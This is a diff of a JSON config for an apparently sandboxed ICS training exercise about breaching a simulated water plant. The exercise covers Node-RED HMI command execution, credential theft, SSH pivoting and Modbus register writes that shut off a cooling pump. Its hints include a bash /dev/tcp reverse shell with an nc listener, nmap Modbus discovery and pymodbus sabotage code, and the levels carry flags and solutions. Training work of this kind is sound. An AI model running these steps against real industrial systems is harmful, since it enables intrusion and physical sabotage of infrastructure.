@@ -1,79 +1,97 @@
 {
-  "title": "Industrial Control Hijack and Pivoting Sandbox",
-  "description": "Simulates a multi-hop breach from a corporate entry point, compromising an unauthenticated Node-RED HMI, stealing engineering credentials, pivoting to the EWS, and executing Modbus commands to disable a PLC cooling loop.",
+  "title": "Operation Waterborne: Industrial Control Hijack and Pivoting",
+  "description": "An immersive security exercise mimicking state-sponsored threat actors. You are tasked with assessing the security posture of the 'Resolute' Municipal Water Plant by simulating a multi-hop breach: compromising an exposed HMI, extracting operator credentials, pivoting laterally to the Engineering Workstation, and sabotaging a critical pump via raw Modbus TCP command injection.",
   "state": "RELEASED",
   "show_stepper_bar": true,
   "levels": [
     {
-      "title": "Access the Attacker Workstation",
+      "title": "FOOTHOLD: Access the Attacker Console",
       "level_type": "ACCESS_LEVEL",
       "order": 1,
       "estimated_duration": 2,
       "minimal_possible_solve_time": null,
       "passkey": "start",
-      "cloud_content": "Select the **`attacker-host`** node, open the console, and input the passkey **`start`**.",
-      "local_content": "Input the passkey **`start`** to unlock the first stage."
+      "cloud_content": "### Scenario Overview\n\nYou are a senior red-team operator hired to conduct an authorized adversarial assessment against the Resolute Water Treatment Facility. The plant uses segregated networks based on the ISA-99/IEC 62443 Purdue Model, but you have gained an initial footold inside the corporate management network.\n\n### Your Objective\n\nAccess the **`attacker-host`** (your Kali Linux terminal), open the console, and input the passkey **`start`** to initialize the operation.",
+      "local_content": "Input the passkey **`start`** to unlock the first stage of Operation Waterborne."
     },
     {
-      "title": "SCADA HMI Compromise (Florida Oldsmar Hack)",
+      "title": "EXPLOITATION: SCADA HMI Compromise (Florida Oldsmar Incident)",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
       "estimated_duration": 10,
       "answer": "FLAG{SCADA_HMI_COMPROMISED}",
-      "content": "You are on the corporate network. Direct access to the control network is blocked by the gateway firewall. However, the operations zone SCADA HMI is accessible.\n\nConnect to Node-RED on `192.168.100.10:1880`. Construct a flow to execute a command to read `/root/flag.txt`.\n\n*(Note: Also look inside `/home/debian/ews_credentials.txt` to find credentials for the next hop!)*",
+      "content": "### The Situation\n\nDirect network routing to the PLC control network (`192.168.20.0/24`) is blocked by the gateway firewall (`ot-gateway`). However, network reconnaissance reveals that the SCADA Human-Machine Interface (HMI) running on `192.168.100.10` has a port open in the operations subnet.\n\nThis mirrors the **2021 Oldsmar, Florida water plant breach**, where attackers hijacked an exposed control panel to alter water chemical levels.\n\n### Your Objective\n\n1. Connect to the unauthenticated Node-RED graphical flow editor on the HMI at `http://192.168.100.10:1880`.\n2. Leverage the graphical workspace to run system-level commands as `root` (RCE). Read the flag located at `/root/flag.txt`.\n3. Search the HMI filesystem for any credentials or notes left behind by the plant operators that could allow you to pivot further.",
       "solution": "Drag an inject node wired to an exec node executing 'cat /root/flag.txt' and debug node. Deploy and click inject to output the flag. Run 'cat /home/debian/ews_credentials.txt' to retrieve the SSH credentials.",
       "hints": [
         {
-          "title": "Node-RED Shell Access",
-          "content": "Use the 'exec' node under the advanced tab to run bash commands as root.",
+          "title": "Graphical RCE Node Selection",
+          "content": "Under the 'advanced' tab on the left node-palette, locate the 'exec' node. This node spawns a system shell process. Wire an 'inject' node to its input, and a 'debug' node to its top output. Double-click the 'exec' node and input 'cat /root/flag.txt' in the Command field. Click Deploy, then click the trigger button on the inject node to view the flag in the Debug panel on the right.",
           "hint_penalty": 0,
           "order": 0
+        },
+        {
+          "title": "Credential Hunting",
+          "content": "Plant operators frequently save configurations or backups in home folders. Create a new Node-RED exec node executing 'ls -la /home/debian/' and trigger it. You will see a file named 'ews_credentials.txt'. Read its contents using 'cat /home/debian/ews_credentials.txt' to extract the credentials for the next stage.",
+          "hint_penalty": 0,
+          "order": 1
         }
       ]
     },
     {
-      "title": "EWS Pivot & Internal Recon (Ukraine Power Grid)",
+      "title": "PIVOT: Engineering Workstation lateral Movement (Ukraine Power Grid)",
       "level_type": "TRAINING_LEVEL",
       "order": 3,
-      "estimated_duration": 10,
+      "estimated_duration": 15,
       "answer": "192.168.20.10",
-      "content": "Direct access to the control network remains blocked. Using the engineering credentials stolen from the SCADA HMI (`/home/debian/ews_credentials.txt`), establish an SSH connection to the Engineering Workstation (EWS) at `192.168.20.20`.\n\nFrom the EWS shell, scan the internal control subnet (`192.168.20.0/24`) using ping or nmap to identify the IP address of the active PLC.\n\n**Tip:** You can pivot via the Node-RED exec node (Approach A), or set up an interactive reverse shell from the HMI back to Kali (Approach B) for a more realistic attack chain.\n\nWhat is the IP of the PLC?",
+      "content": "### The Situation\n\nYou now hold credentials for the Engineering Workstation (EWS), which has administrative access to the PLC network. This step mimics the **2015 Ukraine Power Grid cyberattack**, where attackers pivoted from the compromised corporate subnets to the high-privilege EWS nodes to control remote substations.\n\nDirect access to the control subnet (`192.168.20.0/24`) is blocked from Kali, but is permitted from the SCADA HMI.\n\n### Your Objective\n\n1. Establish an interactive terminal connection to the EWS at `192.168.20.20` using the stolen credentials.\n2. Scan the internal control subnet (`192.168.20.0/24`) to identify the IP address of the active PLC.\n\nWhat is the IP address of the PLC?",
       "solution": "SSH into `operator@192.168.20.20` using password `operator123`. Run `nmap -sn 192.168.20.0/24` to discover the active PLC at `192.168.20.10`.",
       "hints": [
         {
-          "title": "Credential Recap",
-          "content": "Log in using: SSH operator@192.168.20.20, Password: operator123.",
+          "title": "SSH Credential Recall",
+          "content": "The operator credentials extracted from the HMI are: User: `operator`, Password: `operator123`.",
           "hint_penalty": 0,
           "order": 0
         },
         {
-          "title": "Alternative: Interactive Reverse Shell",
-          "content": "For an interactive shell: (1) Start `nc -nlvp 4444` on Kali. (2) In the Node-RED exec node, run: `bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'`. (3) Upgrade the caught shell with `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`. (4) Then run `ssh operator@192.168.20.20` directly from the HMI shell.",
+          "title": "Interactive Pivot via PTY Upgrade (Crucial)",
+          "content": "A raw Node-RED shell cannot handle interactive SSH password prompts. You must catch a full terminal session on Kali:\n1. On Kali, start a listener: `nc -nlvp 4444`.\n2. Deploy a Node-RED exec node containing: `bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'` and trigger it.\n3. Once the connection is caught on Kali, upgrade the raw stream to a Pseudo-Terminal (PTY): `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`.\n4. You can now run `ssh operator@192.168.20.20` and type the password manually.",
           "hint_penalty": 0,
           "order": 1
         },
         {
-          "title": "OT Protocol Enumeration",
-          "content": "A ping sweep only finds live hosts, not what they are. To pinpoint the PLC: (1) Scan for Modbus TCP: `nmap -p 502 --open 192.168.20.0/24`. (2) Fingerprint the device: `nmap -p 502 --script modbus-discover 192.168.20.0/24`. (3) Passive observation: `sudo tcpdump -i eth0 -n port 502` — watch for existing traffic to identify the PLC without active probing.",
+          "title": "OT Device Fingerprinting (textbook nmap vs. passive sniffing)",
+          "content": "A simple ping scan (`nmap -sn 192.168.20.0/24`) reveals live hosts, but to identify the PLC specifically, use OT-focused techniques:\n- **Targeted Port Scan:** Scan for standard Modbus TCP (port 502): `nmap -p 502 --open 192.168.20.0/24`.\n- **Modbus Discovery:** Extract device manufacturer details using the Nmap Scripting Engine: `nmap -p 502 --script modbus-discover 192.168.20.0/24`.\n- **Passive Sniffing (Quiet Approach):** Sniff existing control traffic to locate the active controller without sending active probes: `sudo tcpdump -i eth0 -n port 502`.",
           "hint_penalty": 0,
           "order": 2
         }
       ]
     },
     {
-      "title": "Process Sabotage (Modbus Hijack)",
+      "title": "SABOTAGE: Modbus Protocol Injection (Industroyer / Stuxnet)",
       "level_type": "TRAINING_LEVEL",
       "order": 4,
       "estimated_duration": 15,
       "answer": "FLAG{PUMP_DISABLED_SUCCESS}",
-      "content": "The PLC at `192.168.20.10` controls a vital cooling pump mapped to Modbus Holding Register 0. Under normal conditions, this register has the value `1`.\n\nFrom your EWS SSH terminal, use the pre-installed `modbus` CLI utility to write `0` to this register to disable the pump. Once zeroed, the safety logging system will write a log entry to `/var/log/safety_override.txt` containing the flag.\n\nWhat is the sabotage flag?",
+      "content": "### The Situation\n\nYou have gained access to the Engineering Workstation (`192.168.20.20`) and identified the target PLC at `192.168.20.10`. The controller manages a cooling loop pump mapped to Modbus Holding Register 0 (PLC Address 40001). Currently, the register is set to `1` (normal operational loop).\n\nLike **Stuxnet (2010)** or **Industroyer (2016)**, you will inject raw industrial protocol commands to directly manipulate physical process registers.\n\n### Your Objective\n\n1. From the EWS terminal, write the sabotage value `0` to Holding Register 0 to force the cooling pump to turn off.\n2. The safety monitoring sidecar running on the EWS will detect the unauthorized register overwrite and record the validation flag in the safety log.\n3. Retrieve the flag from the EWS log directory to complete the assessment.",
       "solution": "From the EWS shell, run: `modbus 192.168.20.10 0=0`. Then run `cat /var/log/safety_override.txt` to read the flag.",
       "hints": [
         {
           "title": "Modbus CLI Syntax",
-          "content": "The command is: `modbus 192.168.20.10 0=0`.",
+          "content": "The pre-installed `modbus` CLI utility lets you execute Modbus commands simply: `modbus <PLC_IP> <Register_Address>=<Value>`. To write 0 to register 0 on the target, run: `modbus 192.168.20.10 0=0`.",
           "hint_penalty": 0,
           "order": 0
+        },
+        {
+          "title": "Alternative Python Modbus Scripting",
+          "content": "You can write a custom Python script using the installed `pymodbus` package:\n```python\nfrom pymodbus.client import ModbusTcpClient\nclient = ModbusTcpClient('192.168.20.10')\nclient.connect()\nclient.write_register(0, 0) # Writes 0 to register 0\nclient.close()\n```",
+          "hint_penalty": 0,
+          "order": 1
+        },
+        {
+          "title": "Safety Override Log Path",
+          "content": "Once the register is zeroed, the safety monitor daemon instantly writes the flag to `/var/log/safety_override.txt`. Run `cat /var/log/safety_override.txt` to display the flag.",
+          "hint_penalty": 0,
+          "order": 2
         }
       ]
     }
